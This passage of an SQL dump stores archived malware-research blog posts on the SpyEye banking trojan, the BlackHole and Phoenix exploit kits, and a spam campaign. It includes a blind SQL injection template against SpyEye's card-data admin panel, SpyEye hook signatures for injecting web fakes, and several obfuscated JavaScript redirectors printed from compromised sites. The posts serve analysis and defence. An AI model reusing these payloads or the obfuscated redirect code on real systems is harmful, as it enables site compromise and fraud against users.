( jnb  short loc_1000167D) value (carry=0)is zero, the function jumps to the required address which points to the bot guid \"unknown\".The gate collector function TakeGateToCollector is structured as followsvoid TakeGateToCollector(LPVOID lpGateFunc);typedef void (*GATETOCOLLECTOR)(IN PBYTE pbData, IN DWORD dwSize);The next function that plays a critical role in hijacking the HTTP communication channel is Callback_OnBeforeLoadPage. The code snippet taken from this function is presented belowThe function loads the bot guid, URI and data  by calling a same sub routine as \"sub_10001370\", which is an appropriate string checking and terminating routine to scrutinize appropriate parameters passed to the SpyEye function. The above presented snippet from the code shows the dissection of strings. The \"strstr\" and \"strtok\" functions are used together to find similar patterns and separating string from tokens (\"&\"). Basically, in this function it is used for URL dissection and collection of data from a raw source (i.e. information extraction from raw HTTP content). The XREF structure of the plugin module is traced belowSo this post clearly indicates the data collection working of SpyEye bot by analyzing a specific DLL sample.We will be covering the analysis of other modules (some new ones) in upcoming posts.', '', 'https://secniche.blogspot.com/2011/02/spyeye-creditgrabdll-module.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, '\nBlack Hole - Exploit Obfuscation\n', 'Aditya K Sood', '2011-01-29T09:32:00-08:00', 'Recently, we were analyzing some of the exploits bundle together with BlackHole exploit pack. Again we want to say that \"Russian Malware is on Fire\". BlackHole exploit pack is emerging with fast pace thereby exploiting the browsers at rapid pace.  During our analysis, we came across certain number of malicious files labeled as \"new.avi\". In reality, these files were exploits that are obfuscated in a good manner. On digging deeper, we find that BlackHole exploit pack is using a well designed JavaScript obfuscation mechanism in order to encode the code thereby resulting in bypass of all sorts of anti viruses. We conducted a small test of relative malicious binary \"new.avi\" which was a Java SMB exploit for \"CVE-2010-1423\", \"CVE-2010-0886\". On carrying anti virus detection test, we found that all AV\'s failed to detect it.This completely shows the fact that, JavaScript obfuscation is used in BlackHole exploit pack is not easily detectable by the AV agents. On continuous approach of understanding the artifacts, we confirm that Blackhole is using \"Crypt\" code in order to obfuscate the exploits. The domain is \"CRYPT.IM\" as presented belowThis service challenges that crypt can bypass all types of AV,s. Well give a try.', '', 'https://secniche.blogspot.com/2011/01/black-hole-exploit-obfuscation.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, '\nISSA Journal - JavaScript Infection Model\n', 'Aditya K Sood', '2011-01-23T06:19:00-08:00', 'ISSA Journal Paper - JavaScript Infection ModelView more documents from Aditya K Sood.', '', 'https://secniche.blogspot.com/2011/01/issa-journal-paper-javascript-infection_23.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, '\nMalware Paradox - CIA (AAVAR 2010)\n', 'Aditya K Sood', '2010-11-23T10:34:00-08:00', '13th Symposium of Association of Anti Virus Asia Researchers (AAVAR 2010) conferenceView more presentations from Aditya K Sood.', '', 'https://secniche.blogspot.com/2010/11/malware-paradox-cia-aavar-2010.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, '\nBinding SpyEye (1.0.x) with BSQL Injection\n', 'Aditya K Sood', '2010-11-18T19:08:00-08:00', 'This is true that \"vulnerabilities die hard\". Recently during the process of testing, it has been detected that some of the released versions of SpyEye starting from 1.0.x has shown an interesting weakness in the \"frm_cards_edit.php\" module.  This PHP module  is present in the main admin panel and used to manage the credentials. The \"id\" parameter is used with \"GET\" request to fetch credit card details thereby updating the database after-wards.This module is vulnerable to blind SQL injection. $data= \'\"id\" : \"1 AND [Union SQL Poisoning Code]));-- /*\"\'$encode_data= apply encoding module on $data$http_request(\"GET\", path + \"frm_cards_edit.php?\" + $encode_data )Some of the traces of the vulnerable PHP module is presented below.<?phprequire_once \'mod_dbase.php\';require_once \'mod_time.php\';require_once \'mod_crypt.php\';require_once \'mod_file.php\';$id_card = $_GET[\'id\']; if (!@$id_card) exit;$dbase = db_open();if (!$dbase) exit;   $sql = \' SELECT cards.num, cards.csc, cards.exp_date, cards.name, cards.surname, cards.address, cards.city, cards.state, cards.post_code, country_t.name_country, cards.phone_num, email_t.value_email \'  . \' FROM cards, country_t, email_t\'  . \' WHERE cards.fk_email = email_t.id_email\'  . \' AND cards.fk_country = country_t.id_country\'  . \" AND cards.id_card = $id_card\"  . \' LIMIT 0, 1\';$res = mysqli_query ($dbase, $sql);if ((!(@($res))) || !mysqli_num_rows($res)) { writelog (\"error.log\", $sql); db_close($dbase); exit();}$res = mysqli_fetch_row($res);list($num_card, $csc, $exp_date, $name, $surname, $address, $city, $state, $post_code, $country, $phone_num, $email) = $res;db_close($dbase);list($year, $month) = split(\'[\\/.-]\', $exp_date);$res[2] = $exp_date = gmdate(\"m/y\", gmmktime(0, 0, 0, $month, 1, $year));$res[0] = $num = encode(base64_decode($num_card), $csc);// labels & names$reslb[\'num\'] = \'Card number\';$reslb[\'csc\'] = \'CSC\';$reslb[\'exp_date\'] = \'Exp. date\';$reslb[\'name\'] = \'Name\';$reslb[\'surname\'] = \'Surname\';$reslb[\'address\'] = \'Address\';$reslb[\'city\'] = \'City\';$reslb[\'state\'] = \'State\';$reslb[\'post_code\'] = \'ZIP\';$reslb[\'country\'] = \'Country\';$reslb[\'phone\'] = \'Phone\';$reslb[\'email\'] = \'E-Mail\';// lengths$lnexp = 7;$resln[0] = $numln = strlen($num) + $lnexp;$resln[1] = $cscln = strlen($csc) + $lnexp;$resln[2] = $exp_dateln = strlen($exp_date) + $lnexp;$resln[3] = $nameln = strlen($name) + $lnexp;$resln[4] = $surnameln = strlen($surname) + $lnexp;$resln[5] = $addressln = strlen($address) + $lnexp;$resln[6] = $cityln = strlen($city) + $lnexp;$resln[7] = $stateln = strlen($state) + $lnexp;$resln[8] = $post_codeln = strlen($post_code) + $lnexp;$resln[9] = $countryln = strlen($country) + $lnexp;$resln[10] = $phone_numln = strlen($phone_num) + $lnexp;$resln[11] = $emailln = strlen($email) + $lnexp;?>It works efficiently in number of cases. Thanks to my team.', '', 'https://secniche.blogspot.com/2010/11/binding-spyeye-10x-with-blind-sql.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, '\nSpyEye\'s Analysis Derived from Weak Base\n', 'Aditya K Sood', '2010-11-12T10:04:00-08:00', 'Recently, there has been a post at Fortinet\'s blog \"SpyEye Exposes Mule\" which reflects an example of analysis based on a weak base. It is always good to share analysis using differential information but it should have sound base. Understanding, the critical nature of SpyEye, it requires a complete understanding of malware framework. This type of analysis results in unclear information from technical perspective thereby raising complexity in real time environment.  The purpose of this post is to raise a point about half flooded analysis of malware. There are lot of misleading points in this analysis as follows\"the most current version of SpyEye we could get our hands on (W32/SpyEye.C!tr.spy).Which version of SpyEye has been analyzed? No information! Are they talking about signatures ((W32/SpyEye.C!tr.spy).)? That is complete different aspect of version information of malware.\"SpyEye connects to a “log server” that is different than the server where it fetches updates from, where fraudulent transactions done by the Trojan are logged\"Well, this is not new in the version. Further, the details of this process has been released in our previous post \"SpyEye Backend Collector\" This is a claim which is completely out of the analytical point of view because it requires an understanding of complete chronology of SpyEye development framework This feature was actually introduced in SpyEye version 1.0.75The snapshots provided of the logs do not explain the real technical details of the actual nature of the attack and the outcome presented. In order to deliver information, We can explain a detailed post on it. Later on. Further, down the blog post, it has been stated about \"SpyEye Upper Limit\". In general , there is no such upper limit of SpyEye. It depends on botmaster itself how he wants to design the stealer plugin considering the inherent SDK. Primarily, it is more of banking terms used in money laundering attacks. Most of the banking Trojans use same set of fake transaction strategy (mules and drops). In general, it is an uncompressed LZO log of successful infection.It could have been better if technical details based on strong base is considered. We would like to see some more technical details as stated at the end of blog post.', '', 'https://secniche.blogspot.com/2010/11/ignoring-reality-spyeyes-analysis.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, '\nPhoenix Exploit Kit  (2.4) - Infection Analysis\n', 'Aditya K Sood', '2010-10-05T08:52:00-07:00', 'Phoenix exploit kit is one of the best Browser Exploit Pack (BEP) in the market nowadays. Looking at the pace of development, it seems like we are going to see plethora of advancements in this BEP. In this post , we are aiming to disclose some of the findings and reviews about the latest Phoenix BEP version 2.4. Primarily, we will be talking about the following metrics in detail to discuss the impact of this BEP.1. Exploitation Success Rate (ESR).2. Loader Infection Success Rate (LISR).The most critical part of testing BEP\'s is to determine the success rate of loading a bot or executable once the target is exploited in real time environment. This metric is quite important because number of browser exploit packs suffer from huge loss in loading activity even after the exploitation. However, many times it has been noticed that most of the statistics provided by BEP\'s claiming the fact that infection rate based on ESR to be thousands of machines. But the installation rate is very less. Based on our analysis, we are raising a point on the effectiveness of BEP. If the exploitation rate is high it means the BEP has to be robust enough to perform the successful installs.A generic experiment was conducted on some of the samples of Phoenix Exploit Kit 2.x - 2.4 in a controlled environment to detect the possible rates of infection. The output is presented as follows[1] Browser Exploitation Rate (BER)Microsoft Internet Explorer (IE6+IE7+IE8) -  25% Firefox (All Versions)                    -  17% - 22%[2] Operating Systems Exploitation Rate (OSER)Windows XP    :  25% - 30%Windows Vista :  18% - 22% Windows 7     :  5% - 8%  [3] Traffic Infection Rate (TIR)Mixed Traffic Rate (Hard+Generic) = 70% - 80% [4] Loader Infection Success Rate (LISR)Loader Installation Rate after exploitation - 90%This gives us an indication about the exploitation ratios of browsers and operating systems. Windows 7 shows less vulnerable because of the protection mechanisms developed in it. Phoenix BEP converts 70%-80% of traffic to be infected. As it has been discussed above, the loader installation loss is quite less as compared to other BEP\'s. We can consider the fact of firewalls and other possible scenarios where security mechanisms can reduce the loader installation rate to 10%-15%.However, considering the stats the rate is still high.Note: The infection rate varies depending on the rate of traffic but the overall stats remain the same.With the release of version 2.4 we will be encountering following exploits and codesAdded JAVA TC (privilege escalation) which works instead of JAVA DE-SERIALIZE and JAVA GSB exploits.It breaks JRE/JDK 1.5.0-1.5.0_23 and 1.6.0-1.6.0_18 on Win XP/VISTA/7.Added QUICKTIME exploit for QUICKTIME PLAYER v. 7.6.6-7.6.7 on Win XP for IE 6/7/8.Added PDF FONT exploit for ADOBE READER 9.3.1-9.3.4 on Win XP/VISTA/7. Vulnerability is not patched yet!(Hitting Anti Viruses Hard) Random file-names of BEP structure.(Stealth Technique) Link Encryption in JAVA exploit.Phoenix 2.4 has shown good advancements. So overall this exploit pack is building really good codes to dismantle the web.', '', 'https://secniche.blogspot.com/2010/10/phoenix-exploit-kit-24-analysis.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, '\nSpyEye Backend Collector -  Victim Databases\n', 'Aditya K Sood', '2010-08-31T19:08:00-07:00', 'SpyEye is a fast growing platform that is used for bot infection. SpyEye uses a definitive back end engine for collecting information from the bots. The SpyEye collector is not a part of the admin interface which is used to manage certain specific controls. The collector is an independent component of SpyEye infection platform. This method is used by SpyEye in order to make this component completely unique from the perspective of collecting information from various infected systems all around the world. It means the admin interface has no relation and impact on the working of backend collector because this component works inadvertently even if the admin is disabled or not working. Well, this is quite impressive in its functioning. It means that in a botnet, the main admin that starts infection does not have a much relation with the component that collects information from the bots. Basically, SpyEye uses a daemon for Linux. It listens on a specific port, collect logs and store information in database. The logs use special compression library termed as LZO for real time data compression. Actually, the LZO is primarily known for its speed over compression ratio. The compression in itself is really fast in LZO and it does not require any memory for decompression. LZO use algorithms that are thread safe, lossless and portable. This provides a glimpse of high compression used for log transmission over the internet from the bots to the backend collector daemon. This simply sets the traffic control in a strict manner thereby economize traffic to transfer logs directly without much interference.The SpyEye collector looks like as followsSpyEye has its own SDK and development platform which is designed for generating plugins for infecting victims and stealing specific information. Through plugins, data can be easily transferred to collector. SpyEye provides relative function as a part of its API as followsvoid TakeGateToCollector(LPVOID lpGateFunc);This function is used in the SpyEye plug-in development as followsThe page is dumped asThe collector is configured in the builder part of SpyEye as followsThe collected logs provide statistics as followsSpyEye uses a good technique and provision of storing information irrespective of user centric access.', '', 'https://secniche.blogspot.com/2010/08/spyeye-backend-collector-generating.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, '\nSpyEye 1.2.22 - Art of  Web Fakes - Malware\n', 'Aditya K Sood', '2010-08-28T06:43:00-07:00', 'SpyEye is one of the latest infection platform on the web which includes a satisfactory browser exploit pack and bot generating system. With the latest SpyEye version starting from 1.2.2X (1.2.4) on the run, we have noticed a state of web fakes which is generated in an artistic manner by the SpyEye. If we look at the profitable nature of SpyEye, it is named as banking Trojan, which comprises of efficient techniques to infect bank websites. In this post, we are going to talk about the technique used by SpyEye to infect banks website with Web Fakes. SpyEye uses a well defined SDK for its development and infection among websites. It uses the same DLL injection technique. According to definition \"DLL injection is a technique used to run code within the address space of another process by forcing it to load a dynamic-link library. DLL injection is often used by third-party developers to influence the behavior of a program in a way its authors did not anticipate or intend.\" In general it works as follows1. At first, SpyEye infect the processes by DLL Injection in most of standard DLL\'s used by HTTP and socket generation functions in the system. It uses DLL hooking to take control of certain functions such as HTTP requests GET/POST to monitor the functioning of process. 2. SpyEye extensibility depends a lot on plug-in designing. The plug-ins have additional infection code which is to be injected into the process for variety of infections. This is done to ensure that initial process of infection remains intact. Plug-ins are used to increase the level of infection at later stage looking at the capability of infected targets.3. SpyEye uses named pipes, as the same window concept, to read data from plugins and infecting HTTP processes directly.SpyEye SDK uses following functions as follows[1] DLLEXPORT bool IsGlobal() { return true; } This function is called by plug-in itself at the start. It provides a full access to plug-in to communicate all the infected processes so that it is possible for plug-in to take control of all the infected interfaces directly from the source.[2] DLLEXPORT void Callback_OnBeforeLoadPage(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szPostVars, OUT PCHAR * lpszContent, OUT PDWORD lpdwSize) {}This function is called by plug-ins to set a hook on the HTTP/HTTPS request, so that contents of the page can be reported back to centralized repository for analyzing the type of information is going out of the network. Let\'s see the layout[3] DLLEXPORT void Callback_ProcessContentOfPage(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szPageContent, OUT PCHAR * szOut, IN OUT PDWORD lpdwSize) {}This function is used to infect the web page dynamically. It again performs a hook exactly before the page is about to render in the browser. It provides an edge to update page contents and inject additional Web Fakes in banking websites. Let\'s see[4]DLLEXPORT void FreeMem(LPVOID lpMem) {}At last, this function is used to set the allocated resource free. A good memory allocation and management benchmark :)SpyEye mainly infects following DLL\'sThe payload to be injected or data to be used for infection is applied as follows#include \"data.cpp\" /*unsigned char data[] = {0x48, 0x54, 0x54, 0x50, 0x2F, 0x31, 0x2E, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4F, 0x4B, 0x0D,0x0A, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x6E, 0x74, 0x2D, 0x54, 0x79, 0x70, 0x65, 0x3A, 0x20, 0x74,0x65, 0x78, 0x74, 0x2F, 0x68, 0x74, 0x6D, 0x6C, 0x3B, 0x20, 0x63, 0x68, 0x61, 0x72, 0x73, 0x65,0x74, 0x3D, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x0D, 0x0A, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x3A,0x20, 0x73, 0x72, 0x76, 0x0D, 0x0A, 0x0D, 0x0A, 0x3C, 0x68, 0x31, 0x3E, 0x57, 0x65, 0x62, 0x66,0x61, 0x6B, 0x65, 0x73, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x77, 0x3C, 0x2F, 0x68, 0x31, 0x3E,0x3C, 0x62, 0x72, 0x3E, 0x3C, 0x62, 0x3E, 0x74, 0x61, 0x64, 0x61, 0x21, 0x3C, 0x2F, 0x62, 0x3E }; */Let;s see the SpyEye Plug-ins infection at world levelSo the Web Fakes look like as followsThis is really disastrous from security point of view as well as looking at the scenario of stealing information from victim machines by fooling them completely. This type of Malware is getting deadly day by day.But that\'s true.', '', 'https://secniche.blogspot.com/2010/08/spyeye-1222-generating-web-fakes.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, '\n[Virus Bulletin Conference] The TAO of Automated Iframe Injectors - Building Drive-by Platforms For', 'Aditya K Sood', '2017-05-14T10:55:00-07:00', 'In this paper, we present the design of distributed infection model used by attackers to inject malicious iframes on the fly to conduct large scale drive-by download attacks. We use the term “Iframe Injectors” which refers to the automated tools used by attackers to trigger mass infections. The Iframe Injectors can either be standalone tools or embedded components as a part of the botnets. We discuss the classification of Iframe Injectors and dissect a number of existing tools to understand their functionalities and how they are deployed effectively.\n\nIframes are inline frames, which are HTML objects that are embedded in a web page to fetch content (HTML or JavaScript) from a third-party domain. The content is treated as a part of the primary web page and is served when that web page is accessed. This is a known HTML functionality and is heavily used for content sharing among multiple domains. However, attackers abuse this functionality in multiple variants of drive-by download attacks as a part of massive iframe infection campaigns. An attack starts with a malicious domain that hosts malware. The attackers then embed a URL referencing the malware in an iframe and place that in a compromised website (or any other self-managed website). Users are then coerced into visiting the web page that has the iframe embedded in it. When the user visits the page, the malware is fetched from the malicious domain and the end-user system is infected.\n\n\nFor complete details, the paper is available here: https://www.virusbulletin.com/virusbulletin/2016/10/tao-automated-iframe-injectors-building-driveby-platforms-fun-and-profit/\n\nPDF is available here: https://www.virusbulletin.com/uploads/pdf/magazine/2016/VB2016-Sood-Bansal.pdf', 'Cybercrime, Iframe injector, Malware, Virus Bulletin', 'https://secniche.blogspot.com/2017/05/virus-bulletin-conference-2016-tao-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, '\n[Updated] Nurturing JavaScript Obfuscation and Fast Flux DNS - \"Whats App Voicemail Spamming\"  for ', 'Aditya K Sood', '2015-09-29T22:31:00-07:00', 'Recently, we analyzed that spammers are doing \"Whats App Fake Voicemail\" spamming to trick end-users to visit online pharmacies\' websites. There are high chances that malware can be downloaded on to the end-user systems visiting these spamming websites. However, during this analysis, we did not notice that behavior.\n\nThe trend of \"Whats App Fake Voicemail\" spamming messages is not new as we have been encountering these spamming activities for last few years. There are not significant changes in the methods of sending \"Whats App Fake Voicemail\" notification messages which are used to lure end-users to visit illegitimate domains. However  from security research perspective, the target is to understand how this spamming attack is carried at the backend.  Since the \"Whats App\" organization brand is treated as a bait, as a result of which, there are high chances that people will click the links in the notification emails. This spamming attack is targeted against broad set of users on the Internet in order to redirect them to the online pharmacies\' outlets managed by Russian cyber actors. Check more on online pharmacies monetary model here : https://en.wikipedia.org/wiki/Online_pharmacy\n\nLet\'s perform the analysis. The end-user receives the email notification for \"Whats App Fake Voicemail\" message as follows:\n\n\n\n\n\nWhen end-user clicks the domain it is redirected to the malicious domain that serves following HTTP response headers as shown below. The landing web pages are hosted on Wordpress portal which looks like to be a compromised website. Let\'s take a close look on the HTTP response headers.\n\nGET /wp-content/themes/eStore/epanel/page_templates/js/educating.php HTTP/1.1\nHost pasarjagakarsa.com\nUser-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0\nAccept text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language en-US,en;q=0.5\nAccept-Encoding gzip, deflate\nConnection keep-alive\n\n(Status-Line) HTTP/1.1 404 Not Found\nServer nginx\nDate Tue, 29 Sep 2015 19:32:40 GMT\nContent-Type text/html\nTransfer-Encoding chunked\nConnection keep-alive\nVary Accept-Encoding\nX-Powered-By PHP/5.4.44\nContent-Encoding gzip\n\nIf you see the highlighted part in the HTTP response headers, it shows \"404 Not Found\" error which generally means resource does not exist on the web server. Infact it is not true, the web server responded back with following content as a part of web page.\n\n\n\n\n\n\n\n\nBefore going further, check our earlier articles on JavaScript de-obfuscation\n\n\n\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-1.html\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-2.html\nhttp://secniche.blogspot.com/2011/04/javascript-camouflaging-primer.html \n\n\n\nIf you notice, the web page has an obfuscated JavaScript embedded in it. Let\'s extract the obfuscated JavaScript as shown below:\n\n\n\n\n\n\n\n\n\nThe obfuscated JS is not that complex and it can be de-obfuscated easily. On de-obfuscation it was observed that the user\'s browser was further redirected to the following domain: \"hxxp://magicorganicmarket.ru\" as shown below:\n\n\n\n\n\n\n\n\n\nDue to misconfiguration on the landing domain:\"hxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/educating.php\" , the directory listing was obtained as follows:\n\n\n\n\n\n\n\n\n\n\nSeveral other malicious links with obfuscated JavaScripts were obtained and presented as follows:\n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/chatterer.php\n\n\n\nfunction celle() { cella=72; cellb=[191,177,182,172,183,191,118,188,183,184,118,180,183,171,169,188,177,183,182,118,176,186,173,174,133,111,176,188,188,184,130,119,119,182,169,188,189,186,169,180,176,173,186,170,187,183,189,188,180,173,188,118,186,189,111,131]; cellc=\"\"; for(celld=0;celld<cellb.length;celld++) { cellc+=String.fromCharCode(cellb[celld]-cella); } return cellc; } setTimeout(celle(),1306);\n\n\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://naturalherbsoutlet.ru/\n\n\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/elimination.php\n\n\n\nfunction sicklee() { sicklea=42; sickleb=[161,147,152,142,153,161,88,158,153,154,88,150,153,141,139,158,147,153,152,88,146,156,143,144,103,81,146,158,158,154,100,89,89,145,143,152,143,156,147,141,139,147,142,141,153,151,154,139,152,163,88,156,159,81,101]; sicklec=\"\"; for(sickled=0;sickled<sickleb.length;sickled++) { sicklec+=String.fromCharCode(sickleb[sickled]-sicklea); } return sicklec; } setTimeout(sicklee(),1276);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://genericaidcompany.ru/\n\n \n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/fresnel.php\n\n\n\nfunction timee() { timea=58; timeb=[177,163,168,158,169,177,104,174,169,170,104,166,169,157,155,174,163,169,168,104,162,172,159,160,119,97,162,174,174,170,116,105,105,167,159,158,163,157,155,166,173,155,160,159,173,159,172,176,163,157,159,173,104,172,175,97,117]; timec=\"\"; for(timed=0;timed<timeb.length;timed++) { timec+=String.fromCharCode(timeb[timed]-timea); } return timec; } setTimeout(timee(),1292);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://medicalsafeservices.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/sensitive.php\n\n\n\nfunction risee() { risea=80; riseb=[199,185,190,180,191,199,126,196,191,192,126,188,191,179,177,196,185,191,190,126,184,194,181,182,141,119,184,196,196,192,138,127,127,192,181,194,182,181,179,196,184,181,194,178,195,199,181,178,189,177,194,196,126,194,197,119,139]; risec=\"\"; for(rised=0;rised<riseb.length;rised++) { risec+=String.fromCharCode(riseb[rised]-risea); } return risec; } setTimeout(risee(),1314);\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://perfectherbswebmart.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\n\n\nfunction likede() { likeda=62; likedb=[181,167,172,162,173,181,108,178,173,174,108,170,173,161,159,178,167,173,172,108,166,176,163,164,123,101,166,178,178,174,120,109,109,173,172,170,167,172,163,176,163,171,163,162,183,180,159,170,179,163,108,176,179,101,121]; likedc=\"\"; for(likedd=0;likedd<likedb.length;likedd++) { likedc+=String.fromCharCode(likedb[likedd]-likeda); } return likedc; } setTimeout(likede(),1296);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://onlineremedyvalue.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction politye() { politya=38; polityb=[157,143,148,138,149,157,84,154,149,150,84,146,149,137,135,154,143,149,148,84,142,152,139,140,99,77,142,154,154,150,96,85,85,148,135,154,155,152,135,146,150,143,146,146,147,135,146,146,84,152,155,77,97]; polityc=\"\"; for(polityd=0;polityd<polityb.length;polityd++) { polityc+=String.fromCharCode(polityb[polityd]-politya); } return polityc; } setTimeout(politye(),1272);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://naturalpillmall.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction travellere() { travellera=56; travellerb=[175,161,166,156,167,175,102,172,167,168,102,164,167,155,153,172,161,167,166,102,160,170,157,158,117,95,160,172,172,168,114,103,103,160,157,170,154,153,164,160,167,172,168,173,170,155,160,153,171,157,102,170,173,95,115]; travellerc=\"\"; for(travellerd=0;travellerd<travellerb.length;travellerd++) { travellerc+=String.fromCharCode(travellerb[travellerd]-travellera); } return travellerc; } setTimeout(travellere(),1290);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://herbalhotpurchase.ru/\n[Updates]\n\n\nAll the information and orders are actually handled by this primary outlet - hxxps://checkoutucxefvfq.fastcheckoutrx.com/\n\n\n\n\n\n\n\nWe performed tests at the network level to understand on how the name servers were configured and we found that DNS fluxing was used in this campaign. The Time-To-Live (TTL) field is set for 600 seconds and after the IP address of the domain changes. \n\n\n\nHere is an example:\n\n\n\nperfectherbswebmart.ru. 600 IN A 82.199.121.167\n\nperfectherbswebmart.ru. 600 IN A 198.144.158.52\n\n\n\nSome analytical points for consideration:\n\n\n\nOverall extensive \".ru\" domains have been used in this spamming campaign.\nOne can conclude that automated spam-code generation tools have been used in this campaign to ease out the process of large scale infection\n\nFor example:- infecting PHP pages with JavaScript obfuscated code hosted on the compromised websites\n\nThe campaign looks like to be executed at an extensive level considering the artefacts.\n\nMany similar instances of JavaScript obfuscation have been analyzed as presented above\nA number of online pharmacy websites found after de-obfuscating the JavaScript:\n\nhxxp://herbalhotpurchase.ru/\nhxxp://naturalpillmall.ru/\nhxxp://onlineremedyvalue.ru/\nhxxp://perfectherbswebmart.ru/\nhxxp://medicalsafeservices.ru/\nhxxp://genericaidcompany.ru/\nhxxp://naturalherbsoutlet.ru/\n\n\n\n\nWe believe that this is just the tip of the iceberg and there will be many more\n\n\nWe won\'t be surprised if the same tactics are used for drive-by download instead of spamming in particular.\n\n\n\nNote: At the time of drafting this post, all the websites were active.\n\nStay Secure !', 'Cybercrime, Malware Obfuscation, Whats App', 'https://secniche.blogspot.com/2015/09/nurturing-javascript-obfuscation-whats.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, '\n[Virus Bulletin Conference] The TAO of Automated Iframe Injectors - Building Drive-by Platforms For', 'Aditya K Sood', '2017-05-14T10:55:00-07:00', 'In this paper, we present the design of distributed infection model used by attackers to inject malicious iframes on the fly to conduct large scale drive-by download attacks. We use the term “Iframe Injectors” which refers to the automated tools used by attackers to trigger mass infections. The Iframe Injectors can either be standalone tools or embedded components as a part of the botnets. We discuss the classification of Iframe Injectors and dissect a number of existing tools to understand their functionalities and how they are deployed effectively.\n\nIframes are inline frames, which are HTML objects that are embedded in a web page to fetch content (HTML or JavaScript) from a third-party domain. The content is treated as a part of the primary web page and is served when that web page is accessed. This is a known HTML functionality and is heavily used for content sharing among multiple domains. However, attackers abuse this functionality in multiple variants of drive-by download attacks as a part of massive iframe infection campaigns. An attack starts with a malicious domain that hosts malware. The attackers then embed a URL referencing the malware in an iframe and place that in a compromised website (or any other self-managed website). Users are then coerced into visiting the web page that has the iframe embedded in it. When the user visits the page, the malware is fetched from the malicious domain and the end-user system is infected.\n\n\nFor complete details, the paper is available here: https://www.virusbulletin.com/virusbulletin/2016/10/tao-automated-iframe-injectors-building-driveby-platforms-fun-and-profit/\n\nPDF is available here: https://www.virusbulletin.com/uploads/pdf/magazine/2016/VB2016-Sood-Bansal.pdf', 'Cybercrime, Iframe injector, Malware, Virus Bulletin', 'https://secniche.blogspot.com/2017/05/virus-bulletin-conference-2016-tao-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, '\n[Updated] Nurturing JavaScript Obfuscation and Fast Flux DNS - \"Whats App Voicemail Spamming\"  for ', 'Aditya K Sood', '2015-09-29T22:31:00-07:00', 'Recently, we analyzed that spammers are doing \"Whats App Fake Voicemail\" spamming to trick end-users to visit online pharmacies\' websites. There are high chances that malware can be downloaded on to the end-user systems visiting these spamming websites. However, during this analysis, we did not notice that behavior.\n\nThe trend of \"Whats App Fake Voicemail\" spamming messages is not new as we have been encountering these spamming activities for last few years. There are not significant changes in the methods of sending \"Whats App Fake Voicemail\" notification messages which are used to lure end-users to visit illegitimate domains. However  from security research perspective, the target is to understand how this spamming attack is carried at the backend.  Since the \"Whats App\" organization brand is treated as a bait, as a result of which, there are high chances that people will click the links in the notification emails. This spamming attack is targeted against broad set of users on the Internet in order to redirect them to the online pharmacies\' outlets managed by Russian cyber actors. Check more on online pharmacies monetary model here : https://en.wikipedia.org/wiki/Online_pharmacy\n\nLet\'s perform the analysis. The end-user receives the email notification for \"Whats App Fake Voicemail\" message as follows:\n\n\n\n\n\nWhen end-user clicks the domain it is redirected to the malicious domain that serves following HTTP response headers as shown below. The landing web pages are hosted on Wordpress portal which looks like to be a compromised website. Let\'s take a close look on the HTTP response headers.\n\nGET /wp-content/themes/eStore/epanel/page_templates/js/educating.php HTTP/1.1\nHost pasarjagakarsa.com\nUser-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0\nAccept 